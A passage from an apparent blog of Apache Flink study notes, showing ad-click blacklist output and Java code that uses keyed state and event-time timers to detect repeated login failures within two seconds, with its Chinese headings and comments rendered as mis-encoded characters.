class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">blacklist-user&gt; beans.BlackListUserWarning&#123;userId=<span class="number">937166</span>, adId=<span class="number">1715</span>, warningMsg=<span class="string">&#x27;click over 100times.&#x27;</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;beijing&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:05:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;shanghai&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:05:00.0&#x27;</span>, count=<span class="number">1</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;guangdong&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:05:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;guangdong&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:10:00.0&#x27;</span>, count=<span class="number">4</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;shanghai&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:10:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;beijing&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:10:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;shanghai&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:15:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;beijing&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:15:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;guangdong&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:15:00.0&#x27;</span>, count=<span class="number">5</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;shanghai&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:20:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;guangdong&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:20:00.0&#x27;</span>, count=<span class="number">5</span>&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><h5 id="æ¶æ„ç™»å½•ç›‘æ§"><a href="#æ¶æ„ç™»å½•ç›‘æ§" class="headerlink" title="æ¶æ„ç™»å½•ç›‘æ§"></a>æ¶æ„ç™»å½•ç›‘æ§</h5><ul><li>åŸºæœ¬éœ€æ±‚ <ul><li>ç”¨æˆ·åœ¨çŸ­æ—¶é—´å†…é¢‘ç¹ç™»å½•å¤±è´¥ï¼Œæœ‰ç¨‹åºæ¶æ„æ”»å‡»çš„å¯èƒ½</li><li>åŒä¸€ç”¨æˆ·ï¼ˆå¯ä»¥æ˜¯ä¸åŒIPï¼‰åœ¨2ç§’å†…è¿ç»­ä¸¤æ¬¡ç™»å½•å¤±è´¥ï¼Œéœ€è¦æŠ¥è­¦</li></ul></li><li>è§£å†³æ€è·¯ <ul><li>å°†ç”¨æˆ·çš„ç™»å½•å¤±è´¥è¡Œä¸ºå­˜å…¥ListStateï¼Œè®¾å®šå®šæ—¶å™¨2ç§’åå‡ºå‘ï¼ŒæŸ¥çœ‹ListStateä¸­æœ‰å‡ æ¬¡å¤±è´¥ç™»å½•</li><li>æ›´åŠ ç²¾ç¡®çš„æ£€æµ‹ï¼Œå¯ä»¥ä½¿ç”¨CEPåº“å®ç°äº‹ä»¶æµçš„æ¨¡å¼åŒ¹é…</li></ul></li></ul><h6 id="POJO-4"><a href="#POJO-4" class="headerlink" title="POJO"></a>POJO</h6><ul><li><p> LoginEvent  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long userId;</span><br><span class="line"><span class="keyword">private</span> String ip;</span><br><span class="line"><span class="keyword">private</span> String loginState;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li><li><p> LoginFailWarning  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long userId;</span><br><span class="line"><span class="keyword">private</span> Long firstFailTime;</span><br><span class="line"><span class="keyword">private</span> Long lastFailTime;</span><br><span class="line"><span class="keyword">private</span> String warningMsg;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 1-ç®€å•ä»£ç å®ç°"><a href="#ä»£ç 1-ç®€å•ä»£ç å®ç°" class="headerlink" title="ä»£ç 1-ç®€å•ä»£ç å®ç°"></a>ä»£ç 1-ç®€å•ä»£ç å®ç°</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.LoginEvent;</span><br><span class="line"><span class="keyword">import</span> beans.LoginFailWarning;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 1:49 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFail</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</span></span><br><span class="line">    URL resource = LoginFail.class.getResource(<span class="string">&quot;/LoginLog.csv&quot;</span>);</span><br><span class="line">    SingleOutputStreamOperator&lt;LoginEvent&gt; loginEventStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LoginEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;LoginEvent&gt;(Time.of(<span class="number">3</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(LoginEvent element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line">    <span class="comment">// è‡ªå®šä¹‰å¤„ç†å‡½æ•°æ£€æµ‹è¿ç»­ç™»å½•å¤±è´¥äº‹ä»¶</span></span><br><span class="line">    SingleOutputStreamOperator&lt;LoginFailWarning&gt; warningStream = loginEventStream</span><br><span class="line">      .keyBy(LoginEvent::getUserId)</span><br><span class="line">      .process(<span class="keyword">new</span> LoginFailDetectWarning(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    warningStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;login fail detect job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰KeyedProcessFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailDetectWarning</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">LoginEvent</span>, <span class="title">LoginFailWarning</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰å±æ€§ï¼Œæœ€å¤§è¿ç»­ç™»å½•å¤±è´¥æ¬¡æ•°</span></span><br><span class="line">    <span class="keyword">private</span> Integer maxFailTimes;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼šä¿å­˜2ç§’å†…æ‰€æœ‰çš„ç™»å½•å¤±è´¥äº‹ä»¶</span></span><br><span class="line">    ListState&lt;LoginEvent&gt; loginFailEventListState;</span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼šä¿å­˜æ³¨å†Œçš„å®šæ—¶å™¨æ—¶é—´æˆ³</span></span><br><span class="line">    ValueState&lt;Long&gt; timerTsState;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LoginFailDetectWarning</span><span class="params">(Integer maxFailTimes)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.maxFailTimes = maxFailTimes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      loginFailEventListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;LoginEvent&gt;(<span class="string">&quot;login-fail-list&quot;</span>, LoginEvent.class));</span><br><span class="line">      timerTsState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;timer-ts&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;LoginFailWarning&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å®šæ—¶å™¨è§¦å‘ï¼Œè¯´æ˜2ç§’å†…æ²¡æœ‰ç™»å½•æˆåŠŸï¼Œåˆ¤è¯»ListStateä¸­å¤±è´¥çš„ä¸ªæ•°</span></span><br><span class="line">      ArrayList&lt;LoginEvent&gt; loginFailEvents = Lists.newArrayList(loginFailEventListState.get().iterator());</span><br><span class="line">      <span class="keyword">int</span> failTimes = loginFailEvents.size();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (failTimes &gt;= maxFailTimes) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœè¶…å‡ºè®¾å®šçš„æœ€å¤§å¤±è´¥æ¬¡æ•°ï¼Œè¾“å‡ºæŠ¥è­¦</span></span><br><span class="line">        out.collect(<span class="keyword">new</span> LoginFailWarning(ctx.getCurrentKey(),</span><br><span class="line">                                         loginFailEvents.get(<span class="number">0</span>).getTimestamp(),</span><br><span class="line">                                         loginFailEvents.get(failTimes - <span class="number">1</span>).getTimestamp(),</span><br><span class="line">                                         <span class="string">&quot;login fail in 2s for &quot;</span> + failTimes + <span class="string">&quot; times&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">      loginFailEventListState.clear();</span><br><span class="line">      timerTsState.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(LoginEvent value, Context ctx, Collector&lt;LoginFailWarning&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// åˆ¤æ–­å½“å‰ç™»å½•äº‹ä»¶ç±»å‹</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="string">&quot;fail&quot;</span>.equals(value.getLoginState())) &#123;</span><br><span class="line">        <span class="comment">// 1. å¦‚æœæ˜¯å¤±è´¥äº‹ä»¶ï¼Œæ·»åŠ åˆ°è¡¨çŠ¶æ€ä¸­</span></span><br><span class="line">        loginFailEventListState.add(value);</span><br><span class="line">        <span class="comment">// å¦‚æœæ²¡æœ‰å®šæ—¶å™¨ï¼Œæ³¨å†Œä¸€ä¸ª2ç§’ä¹‹åçš„å®šæ—¶å™¨</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == timerTsState.value()) &#123;</span><br><span class="line">          <span class="keyword">long</span> ts = (value.getTimestamp() + <span class="number">2</span>) * <span class="number">1000L</span>;</span><br><span class="line">          ctx.timerService().registerEventTimeTimer(ts);</span><br><span class="line">          timerTsState.update(ts);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 2. å¦‚æœæ˜¯ç™»å½•æˆåŠŸï¼Œåˆ é™¤å®šæ—¶å™¨ï¼Œæ¸…ç©ºçŠ¶æ€ï¼Œé‡æ–°å¼€å§‹</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">null</span> != timerTsState.value()) &#123;</span><br><span class="line">            ctx.timerService().deleteEventTimeTimer(timerTsState.value());</span><br><span class="line">          &#125;</span><br><span class="line">          loginFailEventListState.clear();</span><br><span class="line">          timerTsState.clear();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoginFailWarning&#123;userId=23064, firstFailTime=1558430826, lastFailTime=1558430826, warningMsg=&#x27;login fail in 2s for 1 times&#x27;&#125;</span><br><span class="line">LoginFailWarning&#123;userId=5692, firstFailTime=1558430833, lastFailTime=1558430833, warningMsg=&#x27;login fail in 2s for 1 times&#x27;&#125;</span><br><span class="line">LoginFailWarning&#123;userId=1035, firstFailTime=1558430844, lastFailTime=1558430844, warningMsg=&#x27;login fail in 2s for 1 times&#x27;&#125;</span><br><span class="line">LoginFailWarning&#123;userId=76456, firstFailTime=1558430859, lastFailTime=1558430859, warningMsg=&#x27;login fail in 2s for 1 times&#x27;&#125;</span><br><span class="line">LoginFailWarning&#123;userId=23565, firstFailTime=1558430862, lastFailTime=1558430862, warningMsg=&#x27;login fail in 2s for 1 times&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 2-ä»£ç å®æ•ˆæ€§æ”¹è¿›"><a href="#ä»£ç 2-ä»£ç å®æ•ˆæ€§æ”¹è¿›" class="headerlink" title="ä»£ç 2-ä»£ç å®æ•ˆæ€§æ”¹è¿›"></a>ä»£ç 2-ä»£ç å®æ•ˆæ€§æ”¹è¿›</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.LoginEvent;</span><br><span class="line"><span class="keyword">import</span> beans.LoginFailWarning;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 1:49 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFail</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</span></span><br><span class="line">    URL resource = LoginFail.class.getResource(<span class="string">&quot;/LoginLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;LoginEvent&gt; loginEventStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LoginEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;LoginEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(LoginEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è‡ªå®šä¹‰å¤„ç†å‡½æ•°æ£€æµ‹è¿ç»­ç™»å½•å¤±è´¥äº‹ä»¶</span></span><br><span class="line">    SingleOutputStreamOperator&lt;LoginFailWarning&gt; warningStream = loginEventStream</span><br><span class="line">      .keyBy(LoginEvent::getUserId)</span><br><span class="line">      .process(<span class="keyword">new</span> LoginFailDetectWarning(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    warningStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;login fail detect job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰KeyedProcessFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailDetectWarning0</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">LoginEvent</span>, <span class="title">LoginFailWarning</span>&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰å±æ€§ï¼Œæœ€å¤§è¿ç»­ç™»å½•å¤±è´¥æ¬¡æ•°</span></span><br><span class="line">    <span class="keyword">private</span> Integer maxFailTimes;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LoginFailDetectWarning0</span><span class="params">(Integer maxFailTimes)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.maxFailTimes = maxFailTimes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼šä¿å­˜2ç§’å†…æ‰€æœ‰çš„ç™»å½•å¤±è´¥äº‹ä»¶</span></span><br><span class="line">    ListState&lt;LoginEvent&gt; loginFailEventListState;</span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼šä¿å­˜æ³¨å†Œçš„å®šæ—¶å™¨æ—¶é—´æˆ³</span></span><br><span class="line">    ValueState&lt;Long&gt; timerTsState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> 